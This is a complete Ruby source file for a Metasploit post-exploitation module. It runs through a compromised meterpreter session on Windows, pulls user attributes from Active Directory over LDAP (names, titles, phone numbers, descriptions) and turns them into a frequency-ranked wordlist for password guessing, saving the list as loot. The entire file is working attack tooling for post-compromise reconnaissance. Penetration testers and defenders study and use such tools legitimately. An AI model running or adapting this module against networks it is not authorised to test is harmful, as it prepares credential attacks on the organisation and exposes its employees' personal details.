##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  DEFAULT_FIELDS = [
    'sn',
    'givenName',
    'state',
    'postalCode',
    'physicalDeliveryOfficeName',
    'telephoneNumber',
    'mobile',
    'facsimileTelephoneNumber',
    'displayName',
    'title',
    'department',
    'company',
    'streetAddress',
    'sAMAccountName',
    'comment',
    'description'
  ]

  def initialize(info={})
    super( update_info( info,
      'Name'         => 'Windows Active Directory Wordlist Builder',
      'Description'  => %q{
        This module will gather information from the default Active Domain (AD) directory
        and use these words to seed a wordlist. By default it enumerates user accounts to
        build the wordlist.
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['Thomas Ring'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))

    register_options([
      OptString.new('FIELDS', [true, 'Fields to retrieve (ie, sn, givenName, displayName, description, comment)', DEFAULT_FIELDS.join(',')]),
      OptString.new('FILTER', [true, 'Search filter.','(&(objectClass=organizationalPerson)(objectClass=user)(objectClass=person)(!(objectClass=computer)))'])
    ])
  end

  def run
    fields = datastore['FIELDS'].gsub(/\s+/,'').split(',')
    search_filter = datastore['FILTER']
    q = nil

    begin
      q = query(search_filter, datastore['MAX_SEARCH'], fields)
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      # Can't bind or in a network w/ limited accounts
      print_error(e.message)
      return
    end

    return if q.nil? || q[:results].empty?

    @words_dict = {}
    q[:results].each do |result|
      result.each do |field|
        search_words(field[:value])
      end # result.each
    end # q.each

    # build array of words to output sorted on frequency
    ordered_dict = @words_dict.sort_by { |k,v| v }.reverse
    ordered_dict.collect! { |k, v| k }

    if ordered_dict.blank?
      print_error("The wordlist is empty")
      return
    end

    print_good("Wordlist with #{ordered_dict.length} entries built")
    stored_path = store_loot('ad.wordlist', 'text/plain', session, ordered_dict.join("\n"))
    print_good("Results saved to: #{stored_path}")
  end

  def search_words(field)
    return if field.blank?
    return if field =~ /^\s*$/ || field.length < 3

    field.gsub!(/[\(\)\"]/, '') # clear up common punctuation in descriptions
    field.downcase!             # clear up case

    words = field.split(/\s+|=|\/|,|\+/)
    return if words.empty?

    words.each do |word|
      next if word.length < 3 || word.length > 24
      if @words_dict[word]
        @words_dict[word] += 1
      else
        @words_dict[word] = 1
      end
    end
  end
end

